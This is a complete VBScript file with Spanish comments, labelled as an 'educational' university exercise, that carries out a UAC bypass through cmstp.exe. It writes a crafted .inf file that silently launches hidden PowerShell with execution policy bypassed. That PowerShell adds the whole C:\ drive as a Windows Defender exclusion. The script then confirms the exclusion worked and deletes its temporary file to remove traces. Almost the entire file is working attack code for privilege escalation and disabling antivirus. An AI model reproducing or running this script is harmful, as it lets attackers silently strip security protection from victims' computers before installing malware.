' Script VBScript avanzado con autoelevación usando cmstp.exe (UAC Bypass)
' Versión mejorada con mejor manejo de errores y limpieza
' Método educativo para parcial universitario

Option Explicit

Dim ws, fso, tempFolder, infFile, scriptPath, scriptName
Dim psCommand, result, checkCommand, cmstpPath
Dim logFile

' Crear objetos necesarios
Set ws = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

scriptPath = WScript.ScriptFullName
scriptName = fso.GetBaseName(scriptPath)
tempFolder = fso.GetSpecialFolder(2) ' Temp folder
cmstpPath = ws.ExpandEnvironmentStrings("%SystemRoot%\System32\cmstp.exe")
infFile = tempFolder & "\" & scriptName & "_" & Timer & ".inf"
logFile = tempFolder & "\" & scriptName & "_log.txt"

' Función para escribir log
Sub WriteLog(message)
    On Error Resume Next
    Dim ts
    Set ts = fso.OpenTextFile(logFile, 8, True) ' Append mode
    ts.WriteLine Now & " - " & message
    ts.Close
    Set ts = Nothing
    On Error GoTo 0
End Sub

' Función para limpiar archivos temporales
Sub CleanupFiles()
    On Error Resume Next
    If fso.FileExists(infFile) Then fso.DeleteFile infFile
    On Error GoTo 0
End Sub

WriteLog "Iniciando script con método cmstp.exe"

' Verificar si cmstp.exe existe
If Not fso.FileExists(cmstpPath) Then
    WriteLog "ERROR: cmstp.exe no encontrado"
    MsgBox "cmstp.exe no encontrado en: " & cmstpPath, vbCritical, "Error"
    WScript.Quit 1
End If

WriteLog "cmstp.exe encontrado: " & cmstpPath

' Crear contenido del archivo .inf mejorado
Dim infContent
infContent = "[version]" & vbCrLf & _
    "Signature=$CHICAGO$" & vbCrLf & _
    "AdvancedINF=2.5" & vbCrLf & _
    "[DefaultInstall]" & vbCrLf & _
    "CustomDestination=CustomDestAllUsers" & vbCrLf & _
    "RunPreSetupCommands=RunPreSetupCommandsSection" & vbCrLf & _
    "[RunPreSetupCommandsSection]" & vbCrLf & _
    "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -Command ""& {" & _
        "$ErrorActionPreference = 'Stop'; " & _
        "try { " & _
            "$null = Get-MpPreference -ErrorAction Stop; " & _
            "Add-MpPreference -ExclusionPath 'C:\' -ErrorAction Stop; " & _
            "Start-Sleep -Seconds 1; " & _
            "$exclusions = Get-MpPreference -ExclusionPath; " & _
            "if ($exclusions -contains 'C:\') { " & _
                "Write-Host 'SUCCESS: Exclusion added'; " & _
                "exit 0 " & _
            "} else { " & _
                "Write-Host 'ERROR: Exclusion not found after add'; " & _
                "exit 1 " & _
            "}" & _
        "} catch { " & _
            "Write-Host 'ERROR: ' + $_.Exception.Message; " & _
            "exit 1 " & _
        "}" & _
    "}""" & vbCrLf & _
    "timeout /t 1 /nobreak >nul" & vbCrLf & _
    "del /q /f """ & infFile & """" & vbCrLf & _
    "[CustomDestAllUsers]" & vbCrLf & _
    "49000,49001=AllUSer_LDIDSection, 7" & vbCrLf & _
    "[AllUSer_LDIDSection]" & vbCrLf & _
    ""HKLM"", ""SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE"", ""ProfileInstallPath"", ""%UnexpectedError%"", """"

' Escribir archivo .inf
On Error Resume Next
Dim ts
Set ts = fso.CreateTextFile(infFile, True)
ts.Write infContent
ts.Close
Set ts = Nothing

If Err.Number <> 0 Then
    WriteLog "ERROR: No se pudo crear archivo .inf - " & Err.Description
    MsgBox "Error al crear archivo .inf: " & Err.Description, vbCritical, "Error"
    WScript.Quit 1
End If
On Error GoTo 0

WriteLog "Archivo .inf creado: " & infFile

' Verificar si Windows Defender está disponible
WriteLog "Verificando disponibilidad de Windows Defender..."
checkCommand = "powershell -WindowStyle Hidden -Command ""Get-MpPreference -ErrorAction SilentlyContinue | Out-Null; if ($?) { exit 0 } else { exit 1 }"""
result = ws.Run(checkCommand, 0, True)

If result <> 0 Then
    WriteLog "ERROR: Windows Defender no disponible"
    CleanupFiles
    MsgBox "Windows Defender no está disponible o no está instalado.", vbExclamation, "Advertencia"
    WScript.Quit 1
End If

WriteLog "Windows Defender disponible, ejecutando cmstp.exe..."

' Ejecutar cmstp.exe con el archivo .inf
' /au = instalación automática sin UI
' /s = modo silencioso
On Error Resume Next
Dim cmstpCommand
cmstpCommand = Chr(34) & cmstpPath & Chr(34) & " /au /s " & Chr(34) & infFile & Chr(34)
WriteLog "Comando: " & cmstpCommand
result = ws.Run(cmstpCommand, 0, True)

If Err.Number <> 0 Then
    WriteLog "ERROR al ejecutar cmstp.exe: " & Err.Description
    CleanupFiles
    MsgBox "Error al ejecutar cmstp.exe: " & Err.Description, vbCritical, "Error"
    WScript.Quit 1
End If
On Error GoTo 0

WriteLog "cmstp.exe ejecutado, esperando resultado..."

' Esperar a que se complete la ejecución
WScript.Sleep 4000

' Verificar si la exclusión se agregó correctamente
WriteLog "Verificando exclusión..."
checkCommand = "powershell -WindowStyle Hidden -Command """ & _
    "$exclusions = Get-MpPreference -ExclusionPath; " & _
    "if ($exclusions -contains 'C:\') { exit 0 } else { exit 1 }""" & ""

result = ws.Run(checkCommand, 0, True)

' Limpiar archivo .inf
CleanupFiles

If result = 0 Then
    WriteLog "SUCCESS: Exclusión verificada correctamente"
    MsgBox "La unidad C:\ ha sido excluida exitosamente de Windows Defender." & vbCrLf & _
           "Método utilizado: cmstp.exe (UAC Bypass)", vbInformation, "Éxito"
    WScript.Quit 0
Else
    WriteLog "WARNING: No se pudo verificar la exclusión"
    MsgBox "No se pudo verificar la exclusión. Revisa el log en: " & logFile, vbExclamation, "Advertencia"
    WScript.Quit 1
End If
